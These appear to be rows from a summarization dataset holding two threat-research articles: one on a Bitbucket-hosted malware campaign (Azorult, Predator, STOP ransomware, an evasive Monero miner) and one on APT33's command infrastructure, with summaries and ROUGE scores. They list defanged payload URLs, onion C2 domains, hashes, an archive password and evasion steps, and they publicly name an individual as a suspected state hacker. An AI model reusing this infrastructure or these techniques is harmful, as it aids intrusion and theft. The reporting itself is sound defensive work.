when their tools fail, they can use legitimate ones instead. Security practitioners must find ways to evolve faster and ensure the security of these trusted resources so we can stay ahead of these threats.The best way to defend against an attack like this is to use an iterative security process. Learn more in our whitepaper, ""Unleashing the true potential of MITRE ATT&CK.""Indicators of compromiseClick here for a full list of the IOCs (PDF).MITRE ATT&CK BREAKDOWN";"The report provides an indepth analysis of a multipayload malware campaign. The report begins by discussing Predator the Thief, an information stealer that steals sensitive data like passwords from browsers, takes pictures, takes screenshots, and steals cryptocurrency wallets. Predator had previously been delivered via exploit kits like the RIG Exploit Kit and through phishing attacks. When a user attempts to install the ""free commercial software"", it actually drops Azorult and Predator onto the target machine. Azorult (download.exe) immediately starts stealing information and deleting its binary to cover its tracks. After Azorult executes, Predator (downloadx.exe) creates a connection to Bitbucket to begin downloading additional payloads of Azorult and the Evasive Monero Miner. Cybereason UI: the attack tree of the execution of the malicious zip file. We identified the download URLs for additional payloads of Azorult and the Evasive Monero Miner from a Bitbucket repository at hxxps://bitbucket[. ]org/patrickhornvist/repo/ by unpacking Predator. Deobfuscated strings in memory from downloadx.exe show download URLs of other malware. There are multiple additional payloads on Bitbucket: 1.exe and 3.exe, both of which are Azorult information stealers with different hashes. 2.exe and 8800.exe, both of which are Predator the Thief with different hashes. 4.exe and 5.exe, both of which are the Evasive Monero Miner with different hashes. 111.exe, the STOP ransomware. Through research of other samples related to the campaign, we have identified additional Bitbucket repositories that are likely created by the same threat actor with the";en;{'r': 0.15021929824561403, 'p': 0.9448275862068966, 'f': 0.2592242171218771};{'r': 0.09182692307692308, 'p': 0.8883720930232558, 'f': 0.1664488000448071};{'r': 0.15021929824561403, 'p': 0.9448275862068966, 'f': 0.2592242171218771}
https://www.cybereason.com/blog/research/the-hole-in-the-bucket-attackers-abuse-bitbucket-to-deliver-an-arsenal-of-malware;The Hole in the Bucket: Attackers Abuse Bitbucket to Deliver an Arsenal of Malware;"Research by: Lior Rochberger and Assaf DahanIntroductionCybereason is following an active campaign to deliver an arsenal of malware that is able to steal data, mine for cryptocurrency, and deliver ransomware to victims all over the world. Due to the variety of malware types deployed in this attack, attackers are able to hit victims from all sides and do not have to limit themselves to one attack goal or another. The payloads observed in this campaign originated from different accounts in code repository platform Bitbucket, which was abused as part of the attackers delivery infrastructure.The following malware are deployed and updated using Bitbucket by the threat actor:Predator: Predator is an information stealer that steals credentials from browsers, uses the camera to take pictures, takes screenshots, and steals cryptocurrency wallets.Azorult: Azorult is an information stealer that steals passwords, email credentials, cookies, browser history, IDs, cryptocurrencies, and has backdoor capabilities.Evasive Monero Miner: The Evasive Monero Miner is the dropper for a multi-stage XMRig Miner that uses advanced evasion techniques to mine Monero and stay under the radar.STOP Ransomware: The STOP Ransomware is used to ransom the file system and is based on an open source ransomware platform. It also has downloader capabilities that it uses to infect the system with additional malware.Vidar: Vidar is an information stealer that steals web browser cookies and history, digital wallets, two-factor authentication data, and takes screenshots.Amadey bot : Amadey bot is a simple trojan bot primarily used for collecting reconnaissance information on a target machine.IntelRapid: IntelRapid is a cryptocurrency stealer that steals different types of cryptocurrency wallets.Cybereason reached out to Bitbucket Support and the malicious repositories mentioned in the report were deactivated within a few hours.The flow of the Bitbucket multi-payload attack.This research highlights an ongoing trend with cybercriminals where they abuse legitimate online storage platforms like Github, Dropbox, Google Drive, and Bitbucket to distribute commodity malware.In this campaign, the attackers abuse the Bitbucket platform by creating several user accounts that are updated frequently. Regular updates to the malware stored on these accounts and the use of Themida as a packer are used to evade detection by antivirus products and thwart analysis attempts. They also use the CypherIT Autoit packer to pack Azorult and give additional layers of protection against analysis.This research is particularly interesting because of how the attackers infect a single target machine with multiple different kinds of malware. These kinds of commodity malware are often used for a one-off infection to steal data on the machine and sell it in underground hacking communities. However, in this attack, the attackers chose to integrate malware like coin miners and ransomware, which gives them a more persistent source of revenue. Each piece of malware in this campaign makes the attack stronger, with additional capabilities and features for a greater impact.Key PointsAbuses resource sharing platforms: The Cybereason Nocturnus team is investigating an ongoing campaign that abuses the Bitbucket infrastructure to store and distribute a large collection of different malware. The attackers aren't satisfied with one payload, they want to use multiple to maximize their revenue.Attacks from all sides: This campaign deploys an arsenal of malware for a multi-pronged assault on businesses. It is able to steal sensitive browser data, cookies, email client data, system information, and two-factor authentication software data, along with cryptocurrency from digital wallets. It is also able to take pictures using the camera, take screenshots, mine Monero, and in certain cases also deploy ransomware.Far Reaching: This ongoing campaign has infected over 500,000 machines worldwide thus far.Modular and Constantly Updating: The attackers leverage Bitbucket to easily update payloads and distribute many different types of malware at once. In order to evade detection, they have an array of user profiles and continuously update their repositories, at times as often as every hour.Many kinds of malware : The attackers use the Evasive Monero Miner to steal a combination of data, mine cryptocurrency, and deploy other malware including the Vidar stealer, Amadey Bot, and IntelRapid. They also use Predator the Thief, Azorult, and the STOP ransomware over the course of their activities.Devastating impact: The combination of so many different types of malware exfiltrating so many different types of data can leave organizations unworkable. This threat is able to compromise system security, violate user privacy, harm machine performance, and cause great damage to individuals and corporations by stealing and spreading sensitive information, all before infecting them with ransomware.For a synopsis of this research, check out the Bitbucket Threat Alert.Table of ContentsAnatomy of the Multi-payload AttackInitial compromise via Predator InfostealerThis attack starts with an unsuspecting user downloading a cracked version of commercial software like Adobe Photoshop, Microsoft Office, and others. Threat actors often target users looking for ""free"" commercial products by bundling legitimate software with different kinds of malware. In this instance, we are seeing vast amounts of cracked software bundled with the Azorult Infostealer and Predator the Thief.Predator the Thief is an information stealer that steals sensitive data like passwords from browsers, takes pictures, takes screenshots, and steals cryptocurrency wallets. Predator had previously been delivered via exploit kits like the RIG Exploit Kit and through phishing attacks.When a user attempts to install the ""free commercial software"", it actually drops Azorult and Predator onto the target machine. Azorult (download.exe) immediately starts stealing information and deleting its binary to cover its tracks. After Azorult executes, Predator (dowloadx.exe) creates a connection to Bitbucket to begin downloading additional payloads.Cybereason UI: the attack tree of the execution of the malicious zip file.We identified the download URLs for additional payloads of Azorult and the Evasive Monero Miner from a Bitbucket repository at hxxps://bitbucket[.]org/patrickhornvist/repo/ by unpacking Predator.Deobfuscated strings in memory from downloadx.exe show download URLs of other malware.There are multiple additional payloads on Bitbucket:1.exe and 3.exe, both of which are Azorult information stealers with different hashes.2.exe and 8800.exe, both of which are Predator the Thief with different hashes.4.exe and 5.exe, both of which are the Evasive Monero Miner with different hashes.111.exe, the STOP ransomware.Screenshot of the Bitbucket repo: https://bitbucket[.]org/patrickhornvist/repo/downloadsThrough research of other samples related to the campaign, we have identified additional Bitbucket repositories that are likely created by the same threat actor with the same set of malware samples. Judging by the number of downloads, we estimate over 500,000 machines have been infected by the campaign so far, with hundreds of machines affected every hour.https://bitbucket[.]org/luisdomingue1/new/downloads/https://bitbucket[.]org/BasilCowan/new/downloads/It's worth noting that the payloads on Bitbucket are updated almost constantly by the threat actor, sometimes as often as every few hours. This is likely done to avoid detection by traditional antivirus by replacing old binaries with fresh ones unknown to AV engines.Evasive AzorultAzorult is an information stealer that uses a quick and dirty approach to steal sensitive data. After it successfully steals sensitive information, it deletes any trace of itself by removing all associated files.Attack Flow for AzorultPredator downloads a secondary downloader which is used to download an evasive version of Azorult. In order to download Azorult, this downloader connects to hxxps://2no[.]co/2QqYb5 and downloads an encoded file in a certificate form named bolo.com.The encoded Azorult payload, a file named bolo.com.The downloader uses certutil.exe , a native Windows binary, to decode the payload using the living-off-the-land technique. We have previously reported how the Ramnit trojan has been decoded using this technique. The contents of the decoded payload have another layer of obfuscation as well.The decoded Azorult payload - grol.To execute the decoded payload, the malware launches the Autoit compiler, which the threat actor renamed to lsm.com. AutoIt is a freeware scripting language used to automate the Windows GUI and general scripting. It is compatible with all versions of Windows with no prerequisites, which makes it a useful tool for attackers looking to create malware.Cybereason UI: the attack tree of the evasive Azorult execution.Once executed, Azorult scans the file system and searches for sensitive data like browser data, cookies, email clients and cryptocurrency wallets. It copies this data to the %TEMP% directory, packs it, and sends it to the attacker. Once all information has been exfiltrated, Azorult removes all data copied to %TEMP% and deletes its binary to cover its tracks.STOP Ransomware and the Vidar StealerThe STOP Ransomware was first discovered in 2018, but began its most aggressive campaigns in early 2019. Over the year, it evolved to strengthen its encryption and evade detection, and at one point was even used to deliver Azorult onto victim's systems.Predator downloads the STOP Ransomware from Bitbucket (111.exe) and executes it. STOP gathers information about the target machine by accessing api.2ip.ua and checks to see if it is running on a VM.STOP creates a folder in %AppData%, copies its binary there, and changes access control to the file using icacls so others cannot access it.STOP creates a RUN registry key and a scheduled task to execute itself every five minutes. While running, it connects to the C2 server, sends the C2 the MD5 hash of the MAC address, and downloads a key for file encryption.STOP also downloads additional payloads onto the machine, including:hxxp://ring2[.]ug/files/cost/updatewin2.exehxxp://ring2[.]ug/files/cost/updatewin1.exehxxp://ring2[.]ug/files/cost/updatewin.exehxxp://ring2[.]ug/files/cost/3.exehxxp://ring2[.]ug/files/cost/4.exehxxp://ring2[.]ug/files/cost/5.exeupdatewin.exe and updatewin2.exe help STOP evade detection, and the other payloads are independent pieces of malware: the Visel Trojan, the infamous Vidar stealer, and several other files.Cybereason UI: the process tree of STOP Ransomware and Vidar stealer.Vidar is a well-known information stealer that collects system information, passwords from browsers, email, and two-factor authentication software data. It stores stolen data in a randomly named folder in %ProgramData% and sends the info to its C2 server, besfdooorkoora[.]com. After the data is sent to the attacker, the malware stops the process and deletes its payload from the machine (5.exe).Evasive Monero Miner: Old Miner, New DropperEver since the rise of Bitcoin, miners have gained popularity in the underground community, becoming one of the best sellers for attackers looking to make an easy profit. In this campaign, attackers continue this trend by distributing an Evasive Monero Miner.The Evasive Monero Miner is a dropper that drops a version of the infamous, open source XMRig miner based on its original source code. An older version of the Evasive Monero Miner was first submitted to VirusTotal in late 2018, but was not discovered until December 2019 after a massive campaign that infected machines all over the world.The dropper is packed with Themida, a powerful packer with anti-debug features and a way of packing that intentionally makes it difficult to manually unpack. It uses an Autoit compiled script to unpack and download the XMRig miner. The dropper also uses several evasive techniques it uses to avoid detection, including code injection, file renaming, encoded files, non-executable extensions, and the ability to connect through Tor.Deep Dive into the Monero DropperWhen the Evasive Monero Miner is first executed, it drops several files in the %TEMP% folder:CL_Debug_Log.txtCR_Debug_Log.txtAsacpiex.dll (same as CR_Debug_Log.txt)CL_Debug_Log.txt is the binary for the 7zip executable renamed to hide its activity. It extracts and decodes a 7zip archive named CR_Debug_Log.txt. CR_Debug_Log.txt extracts a 32-bit and 64-bit version of the payload of the miner, 32.exe and 64.exe, into %TEMP%.After extracting the payload, the dropper deletes the encoded archive CR_Debug_Log.txt and checks if the machine's architecture is 32-bit or 64-bit. Depending on the results of the check, it copies the relevant binary, renames it helper.exe, and saves it in \AppData\Roaming\Microsoft\Windows.Cybereason UI: attack tree of the execution of the XMRig Miner DropperThe dropper also creates an XML file in %TEMP% named SystemCheck.xml along with a scheduled task SystemCheck that runs the XML file every minute.The XML file is configured to run helper.exe with the argument -SystemCheck:How Sys5emCheck.xml executes helper.exe.helper.exe is a compiled Autoit script. The script sets a few variables for the malware configuration, including:Command line parameterTCP ProtocolThe mining pool for the miner, with port manip2[.]hk:7777.A list of processes it must check to see if it is being analyzed.Two URL paths public2/udp.txt and public2/32/32.txt, or fpublic2/64/64.txt for the 64-bit version.A password DxSqsNKKOxqPrM4Y3xeK that, based on the name of the variable, is used to decrypt an archive.helper.exe decompiled code: the variables setting.helper.exe contains two embedded binaries built during execution, the first of which is a 7zip binary.helper.exe decompiled code: 7Zip binary embedded code.The second is an encoded 7zip archive for a Tor client named Tor.tmp. Tor.tmp is decoded using the embedded password in helper.exe and extracted to \AppData\Roaming\Microsoft\Windows\Tor\.helper.exe decompiled code: Tor client embedded code.Cybereason UI: command line used to extract the Tor.tmp archive.The dropper checks for various antivirus engines on the target machine, as well as if the SmartScreen feature of Windows Defender exists. SmartScreen is used to protect against phishing and various malware websites.The helper.exe decompiled code: an embedded list of security products.helper.exe holds four domains encoded in Base64:helper.exe decompiled code: embedded Base64 encoded domains.The decoded domains:bgpaio75egqvqigekt5bqfppzgth72r22f7vhm6xolzqd6ohroxs7pqd[.]onionjr2jjfxgklthlxh63cz3ajdvh7cj6boz3c3fbhriklk7yip4ce4vzsyd[.]onionuovyniuak3w4d3yzs4z4hfgx2qa6l2u6cx4wqsje4pmnmygc6vfddwqd[.]onionRcjndzwubq5zbay5xoqk4dnc23gr4ifseqqsmbw5soogye6yysc7nkyd[.]onionThe dropper uses the Tor client to connect to one of the decoded domains, combined with the URL paths, and downloads the contents into a file named SysBackup.tmp and the malware version into a file name upd.version to the target machine. Both of these files are created under \AppData\Roaming\Microsoft\Windows\.helper.exe decompiled code: creating the GET request that downloads the XMRig miner - SysBackup.tmp.After the file is downloaded, the dropper terminates tor.exe.Sysbackup.tmp houses a bytes array for the XMRig miner executable.XMRig file properties.helper.exe spawns attrib.exe and injects the XMRig miner code into memory.XMRig code floating in memory of attrib.exe. Taken using Process Hacker.The dropper executes attrib.exe with a command line that specifies the mining pool and the wallet where the miner will add its resources.helper.exe decompiled code: building the command line for attrib.exe.Closing ThoughtsAttackers continue to abuse legitimate online storage platforms for their own gain. By storing malicious payloads on trusted platforms, attackers can bypass security products to exploit the trust given to legitimate online services. In addition, it provides the attackers with another way of reducing the risk of exposure to their C2 server infrastructure through separating the delivery infrastructure (online storage platforms) from the C2 server infrastructure.In some ways, this attack takes persistent revenue to the next level. These attackers infect the target machine with different kinds of malware to get as much sensitive data as possible, alongside miner capabilities and ransomware capabilities. This attack is the epitome of ""have your cake and eat it too"", with attackers layering malware for maximum impact.Attackers continue to evolve and look for more effective ways to make a profit. They are finding that, when their tools fail, they can use legitimate ones instead. Security practitioners must find ways to evolve faster and ensure the security of these trusted resources so we can stay ahead of these threats.The best way to defend against an attack like this is to use an iterative security process. Learn more in our whitepaper, ""Unleashing the true potential of MITRE ATT&CK.""Indicators of compromiseClick here for a full list of the IOCs (PDF).MITRE ATT&CK BREAKDOWN";"The report provides an indepth analysis of a multipayload malware campaign. The report begins by discussing Predator the Thief, an information stealer that steals sensitive data like passwords from browsers, takes pictures, takes screenshots, and steals cryptocurrency wallets. Predator had previously been delivered via exploit kits like the RIG Exploit Kit and through phishing attacks. When a user attempts to install the ""free commercial software"", it actually drops Azorult and Predator onto the target machine. Azorult (download.exe) immediately starts stealing information and deleting its binary to cover its tracks. After Azorult executes, Predator (downloadx.exe) creates a connection to Bitbucket to begin downloading additional payloads of Azorult and the Evasive Monero Miner. Cybereason UI: the attack tree of the execution of the malicious zip file. We identified the download URLs for additional payloads of Azorult and the Evasive Monero Miner from a Bitbucket repository at hxxps://bitbucket[. ]org/patrickhornvist/repo/ by unpacking Predator. Deobfuscated strings in memory from downloadx.exe show download URLs of other malware. There are multiple additional payloads on Bitbucket: 1.exe and 3.exe, both of which are Azorult information stealers with different hashes. 2.exe and 8800.exe, both of which are Predator the Thief with different hashes. 4.exe and 5.exe, both of which are the Evasive Monero Miner with different hashes. 111.exe, the STOP ransomware. Through research of other samples related to the campaign, we have identified additional Bitbucket repositories that are likely created by the same threat actor with the";en;{'r': 0.15021929824561403, 'p': 0.9448275862068966, 'f': 0.2592242171218771};{'r': 0.09182692307692308, 'p': 0.8883720930232558, 'f': 0.1664488000448071};{'r': 0.15021929824561403, 'p': 0.9448275862068966, 'f': 0.2592242171218771}
https://www.recordedfuture.com/iranian-cyber-operations-infrastructure;Iranian Threat Actor Amasses Large Cyber Operations Infrastructure Network to Target Saudi Organizations;"Click here to download the complete analysis as a PDF._Insikt Group(r) researchers used proprietary methods, including Recorded Future Network Traffic Analysis and Recorded Future Domain Analysis, along with common analytical techniques, to profile Iranian cyberespionage threat actor APT33 (Elfin) and determine whether the public exposure of their TTPs in March 2019 impacted their operations.Data sources include the Recorded Future(r) Platform, Farsight Security's DNSDB, ReversingLabs, VirusTotal, Shodan, and common OSINT techniques.This report will be of greatest interest to those interested in Middle Eastern geopolitics, as well as network defenders of organizations with a presence in the Middle East or in industries targeted by APT33, such as aerospace and defense, energy, finance, telecommunications, and manufacturing.This research is based on data collected between February 10, 2019 and June 6, 2019._Executive SummaryThe United States and Iran continue to escalate tensions, most recently accelerating rhetoric and actions in the Strait of Hormuz, but also in the cyber domain. Over the past three months, Recorded Future's Insikt Group has observed an increase in APT33's (also known as Elfin) infrastructure building and targeting activity, and on June 21, 2019, Yahoo! News reported that the U.S. Cyber Command launched cyberattacks on an ""Iranian spy group.""Iranian state-sponsored threat actor APT33 has been conducting cyberespionage activity since at least 2013, predominantly targeting nations in the Middle East, but also notably targeting U.S., South Korean, and European commercial entities across a wide variety of sectors.Insikt Group researchers used proprietary methods, including Recorded Future Domain Analysis and Recorded Future Network Traffic Analysis, along with other common analytical approaches, to profile recently reported Iranian threat actor APT33's domain and hosting infrastructure in an effort to identify recent activity and better understand the group's tactics, techniques, and procedures (TTPs).Our research found that APT33, or a closely aligned threat actor, continues to conduct and prepare for widespread cyberespionage activity, with over 1,200 domains used since March 28, 2019 and with a strong emphasis on using commodity malware. Commodity malware is an attractive option for nation-state threat actors who wish to conduct computer network operations at scale and hide in plain sight among the noise of other threat actor activities, thus hindering attribution efforts.The targeting of mainly Saudi Arabian organizations across a wide variety of industries aligns with historical targeting patterns for the group, which appear undeterred following previous exposes of their activity. Western and Saudi -- both public and private sector -- organizations in industries that have been historically targeted by APT33 should be monitoring geopolitical developments and increasing the scrutiny of operational security controls focusing on detection and remediation of initial unauthorized access, specifically from phishing campaigns, webshells, and third-party (vendor and supplier) relationships. Additionally, real-time security intelligence should be used to improve hunting in internal network and host-based telemetry.Key JudgmentsIn response to the publication of operations in late March 2019, domains associated with suspected APT33 activity were parked or changed to new hosting providers.APT33, or a closely aligned threat actor, continues to control C2 domains in bulk. Over 1,200 domains have been in use since March 28, 2019 alone. 728 of these were identified communicating with infected hosts. 575 of the 728 domains were observed communicating with hosts infected by one of 19 mostly publicly available RATs.Almost 60% of the suspected APT33 domains that were classified to malware families related to njRAT infections, a RAT not previously associated with APT33 activity. Other commodity RAT malware families, such as AdwindRAT and RevengeRAT, were also linked to suspected APT33 domain activity.We assess with medium confidence that APT33, or a closely aligned threat actor, has targeted the following organizations since the disclosures in late March: A conglomerate headquartered in Saudi Arabia, with businesses in the engineering and construction, utilities, technology, retail, aviation, and finance sectors Two Saudi healthcare organizations A Saudi company in the metals industry An Indian mass media company A delegation from a diplomatic institutionWe assess that the recent reporting on links between the Nasr Institute and Kavosh Security Group, as well as technical and persona analysis, overlaps among APT33, APT35, and MUDDYWATER, and is probably a result of the tiered structure that Iran utilizes to manage cyber operations.BackgroundAPT33 is an Iranian state-sponsored threat actor that has engaged in cyberespionage activities since at least 2013. They have typically used commodity malware and possess an expansive network infrastructure that enables them to scale their operations for victim targeting. Historically, this targeting has focused on the aerospace and defense industries, as well as the oil and gas industry, with a strong focus on companies based in Saudi Arabia. Symantec's Elfin report denoted additional targeting of the engineering, chemical, research, finance, IT, and healthcare sectors. Recorded Future's Insikt Group has been monitoring APT33 activity, beginning with research published in October 2017, which revealed new infrastructure, malware hashes, and TTPs relating to the threat actor(s).Threat AnalysisOn March 27, 2019, Symantec published research titled, ""Elfin: Relentless Espionage Group Targets Multiple Organizations in Saudi Arabia and U.S."" The report outlined a three- year APT33 cyberespionage campaign. Using the IP addresses and malware hashes provided in that research, Insikt Group researchers conducted a follow-up analysis of the malicious domains used by APT33 to determine two things:Whether or not APT33 had continued their activities, and if so, if they had changed TTPs in response to the publication Whether or not there were any previously unreported historic activities conducted by the group that were worthy of publicationNasr Institute and Kavosh ReduxIn our previous report, ""Iran's Hacker Hierarchy Exposed,"" we concluded that the exposure of one APT33 contractor, the Nasr Institute, by FireEye in 2017, along with our intelligence on the composition and motivations of the Iranian hacker community, pointed to a tiered structure within Iran's state-sponsored offensive cyber program. We assessed that many Iranian state-sponsored operations were directed by the Iranian Revolutionary Guard Corps (IRGC) or the Ministry of Intelligence and Security (MOIS).According to a sensitive Insikt Group source who provided information for previous research, these organizations employed a mid-level tier of ideologically aligned task managers responsible for the compartmentalized tasking of over 50 contracting organizations, who conducted activities such as vulnerability research, exploit development, reconnaissance, and the conducting of network intrusions or attacks. Each of these discrete components, in developing an offensive cyber capability, were purposefully assigned to different contracting groups to protect the integrity of overarching operations and to ensure the IRGC and/or MOIS retained control of operations and mitigated the risk from rogue hackers.Obfuscating Iranian government involvement in offensive campaigns.FireEye also noted in their 2017 report that the online handle ""xman_1365_x,"" found within the PDB path in an APT33 TURNEDUP backdoor sample, belonged to an individual at the Nasr Institute. The same handle was then linked to destructive operations using NewsBeef and StoneDrill malware families. Then, in March 2017, researchers linked StoneDrill to the Shamoon 2 operation and to the APT35 (also known as Charming Kitten, Newscaster, or NewBeef) threat actor.Our previous analyses showed that the person behind the ""xman_1365_x"" handle self-identified on Iranian hacking forums as Mahdi Honarvar from Mashhad, with speculation that he was also affiliated with the Kavosh Security Center since around 2017.Kavosh's role within the Iranian cyber ecosystem was further uncovered by Group-IB's recent analysis detailing that Kavosh was the employer for ""Nima Nikjoo"" between 2006 and 2014. Their analysis concluded that a March 2019 campaign targeting a Turkish military electronics manufacturer was perpetrated by another Iranian threat actor, MUDDYWATER. MUDDYWATER used the POWERSTATS backdoor, proliferated in maldocs that contained metadata revealing the author as ""Gladiyator_CRK,"" with a possible name of ""Nima."" Additionally, an email address suspected to be related, ""gladiyator_cracker@yahoo.com,"" was associated with ""???? ?????,"" which translates to ""Nima Nickjou,"" in a 2014 blog that exposed the names and email addresses of individuals allegedly employed at the Nasr Institute. Another research blog authored by pseudonym ""0xffff0800"" corroborated some of these findings and revealed ""Nima Nikjoo"" to be ""Nima Nikjoo Tabrizi.""LinkedIn profile picture of suspected APT33 threat actor Nima Nikjoo Tabrizi. (Accessed on June 14, 2019)Who Is Nima Nikjoo Tabrizi?OSINT reveals there is an active Linkedin account and other active social media accounts in the name of Nima Nikjoo Tabrizi, claiming that he is a reverse engineer and malware analyst at Symantec. Symantec, however, has confirmed to Recorded Future that Tabrizi has never worked for them:""We have been aware of this individual for a long time. Nima Nikjoo is not a Symantec employee and we have no record of an individual by this name working at Symantec.""Having been exposed working for the Nasr Institute, a government organization, and the Kavosh Security Center, which has strong associations with Iranian state-sponsored cyberespionage activity, we assess with high confidence that Tabrizi is engaged in cyberespionage activity on behalf of the Iranian state.Employment history of suspected APT33 threat actor Nima Nikjoo Tabrizi.Based on this information, it is possible that upon the exposure of the Nasr Institute as a front for Iranian state-sponsored offensive cyber activity, employees transitioned over to other entities, such as Kavosh, to protect their identities and minimize further exposure. There were no further widely reported exposures relating to the Nasr Institute until the links between Mahdi Honarvar to Kavosh Security Center were revealed in 2017. Therefore, we assess that the overlapping technical and personal information points to a historic linkage between the threat actors APT33, APT35, and MUDDYWATER.These technical and persona overlaps among Iranian threat actors are not unexpected given the tiered structure of Iranian state management of cyber operations. Within this structure, we assessed that managers are running multiple teams, some of which are associated with government organizations and others that are contracted private companies (such as ITSec Team).Technical AnalysisAPT33 Cleaning Up?Starting with the APT33 indicators documented by Symantec, Insikt Group profiled the domain and hosting infrastructure used by the group using the Farsight Security extension within the Recorded Future platform, revealing updated IP resolutions for some of the domains.Domain Original IP Resolution (Per Symantec Report) Updated IP Resolutions backupnet.ddns[.]net 25.187.21[.]71, 91.230.121[.]143 95.183.54[.]119 hyperservice.ddns[.]net 8.26.21[.]119 95.183.54[.]119 microsoftupdated[.]com 5.187.21[.]70 52.45.178[.]122 mynetwork[.]cf 192.119.15[.]41, 195.20.52[.]172 195.20.52[.]172 mypsh.ddns[.]net 162.250.145[.]204, 162.250.145[.]234, 192.119.15[.]35, 192.119.15[.]37, 64.251.19[.]214, 64.251.19[.]231, 64.251.19[.]232, 8.26.21[.]120, 8.26.21[.]221, 8.26.21[.]222 No Current Resolution mypsh.ddns[.]net 5.79.127[.]177 0.0.0[.]0 mywinnetwork.ddns[.]net 91.235.142[.]76, 91.235.142[.]124, 89.34.237[.]118 0.0.0[.]0 remote-server.ddns[.]net 192.119.15[.]39, 91.230.121[.]143 0.0.0[.]0 remserver.ddns[.]net 217.147.168[.]44, 91.230.121[.]144 0.0.0[.]0 securityupdated[.]com 217.13.103[.]46 204.11.56[.]48 servhost.hopto[.]org 37.48.105[.]178 95.183.54[.]119, 0.0.0[.]0 service-avant[.]com 213.252.244[.]14 213.252.244[.]144, 51.77.102[.]108 srvhost.servehttp[.]com 8.26.21[.]117, 64.251.19[.]216 95.183.54[.]119 svcexplores[.]com 8188.165.4[.]81 - update-sec[.]com 95.211.191[.]117 -As expected, many of the domains exposed in the original Symantec report have been parked or no longer resolve to a real IPv4 address. Interestingly, four of the original domains (backupnet.ddns[.]net, hyperservice.ddns[.]net, servhost.hopto[.]org, and srvhost.servehttp[.]com) were all updated the day after publication, and resolve to the same IP, 95.183.54[.]119. This IP is registered to Swiss-dedicated hosting provider Solar Communications GmBH. It is unclear as to why these domains were not likewise parked. Possible reasons include:The domains were deemed high value by the threat actor, and therefore retained for continued operational purposes.The operators had difficulty with or could not update the domains for administrative reasons.Recorded Future Intelligence Card(tm) for microsoftupdated[.]com, enriched using the Farsight Security extension.In order to identify additional related and potentially malicious infrastructure, we pivoted on the Swiss IP 95.183.54[.]119 and identified approximately 40 domains that were newly resolving to the IP since mid-February 2019. We positively identified RAT malware communication from a selection of domains.Domain IP Malware Observed Communicating With Domain windowsx.sytes[.]net 95.183.54[.]119 Nanocore hellocookies.ddns[.]net 95.183.54[.]119 Nanocore, QuasarRAT variant njrat12.ddns[.]net 95.183.54[.]119 njRAT trojan1117.hopto[.]org 95.183.54[.]119 njRAT wwwgooglecom.sytes[.]net 95.183.54[.]119 njRAT newhost.hopto[.]org 95.183.54[.]119 njRAT, DarkComet za158155.ddns[.]net 95.183.54[.]119 njRATAdditionally, many of the domains that resolved to the Swiss IP were registered with hostnames that reflected the names of commodity RATs, such as XTreme RAT, xtreme.hopto[.]org, and njRAT ( njrat12.ddns[.]net), as well as popular tools like Netcat (n3tc4t.hopto[.]com). Interestingly, a domain spoofing a popular Farsi-language Telegram channel called BistBots (bistbotsproxies.ddns[.]net) was also co-hosted on the same IP. We assess that this likely indicates a desire to target users of BistBots who seek up-to-date, high-speed internet proxies, possibly to circumvent network filtering and access sites such as Facebook, Twitter, and YouTube, which are restricted in Iran.Further analysis of the domains above, including windowsx.sytes[.]net, njrat12.ddns[.]net, and wwwgooglecom.sytes[.]net shows that they have been classified as C2s for Nanocore and njRAT, according to their respective Recorded Future Intelligence Cards(tm). The information detailed are correlations derived from hash reports from malware multiscanner repositories and malware detonations that contain direct references to the domains.Interestingly, while the Symantec research noted APT33's use of Nanocore, njRAT was not mentioned, which indicates a previously unknown addition to the group's ever-expanding repertoire of commodity malware.Context panel from the Recorded Future Intelligence Card(tm) for windowsx.sytes[.]net, showing the relationship between the domain and the Nanocore RAT malware.The Maltego chart below shows the link analysis of selected domains hosted on the Swiss IP, with derived hashes associated with malware family name.Maltego graph of domains hosted on the known malicious APT33-linked IP.Deeper Infrastructure CorrelationsInsikt Group enumerated all domains reported as being used by APT33 since January 2019. We pivoted through common infrastructure hosting patterns using passive DNS and similar approaches to identify additional suspected APT33 infrastructure.A preliminary analysis identified 1,252 unique, correlated domains likely administered by the same APT33 attackers behind the campaign documented by Symantec. Of these, 728 domains were identified as communicating with files on infected hosts, with 575 of these positively correlated to a RAT malware family. The remaining 153 domains were identified as malicious based on AV engine hits but could not be conclusively classified to a specific malware family automatically.Editor's Note: A selection of the domains, hashes, and associated IP address infrastructure connected to suspected APT33 domains will soon be made available to Recorded Future clients in a specialized Certified Data Set called ""Weaponized Domains,"" enabling companies to regulate the interaction with malicious free/anonymous infrastructure, including dynamic DNS (DDNS) domains.Pie chart of suspected APT33 malware use.A top-level activity breakdown of these suspected APT33 domains and their linked malware families since March 28, 2019 reveals that 60% of the domains use the njRAT malware, with a wide selection of other commodity tools being used. In total, 1,804 unique malware hashes were analyzed to classify them into the 19 malware families, listed below.Malware Family Percentage (%) NJRat 59.99 unknown 25.35 RevengeRAT 4.40 NanoCoreRAT 3.96 DarkComet 1.74 SpyNet 0.87 RemcosRAT 0.76 XtremeRAT 0.60 ImminentMonitor 0.43 NetWireRAT 0.33 Orcus 0.33 QuasarRAT 0.27 888RAT 0.22 qRat 0.22 Adwind 0.16 SandroRAT 0.11 PlasmaRAT 0.11 AsyncRAT 0.05 BitterRat 0.05 StoneDrill 0.05From the table and the accompanying chart, we noted that APT33, or a closely aligned threat actor, have been prolific in their continued use of commodity malware and publicly available tooling, and have added several malware families previously unreported to be associated with the threat actor, including njRAT, RevengeRAT, and AdwindRAT. A significant proportion of the samples (25%), while deemed malicious, contained generic code that could not be definitively classified at a high enough degree of confidence to warrant further manual static analysis. We will continue to focus closely on these samples in subsequent analyses.Many of the domains uncovered spoofed global technology providers such as Microsoft and Google, as well as business-oriented, web-based services such as video conferencing provider Zoom. Geopolitically themed domains were also present in this list of suspected APT33 infrastructure, such as vichtorio-israeli.zapto[.]org (Victory to Israel), fucksaudi.ddns[.]com and palestine.loginto[.]me. The choice of hostnames may offer insight into the targeting pattern of APT33 operations against the Islamic Republic of Iran's perceived enemies -- notably, Israel, Saudi Arabia, and the wider Gulf Cooperation Council (GCC) nations.Domain Malware Family SHA256 fucksaudi.ddns[.]net RevengeRAT d8e60135aecb3a2a7422c06cfb94ed9aaf1182145d1c482f84b0bd81aa5d2416 googlechromehost.ddns[.]net NanoCoreRAT e2cfc91085b9b5db41c4c4297c594758dd9a0c8561ce4544da9faedd3a6b91e8 backupnet.ddns[.]net StoneDrill a217eb149b65552e3127c65c306aa521dca54959ceee89e85dd2e6e38c0d8f8b younesadams.ddns[.]net SandroRAT 410b5f374059cc21b2c738a71957c97e4183d92580d1d48df887deece6d2f663 teamnj.ddns[.]net DarkComet 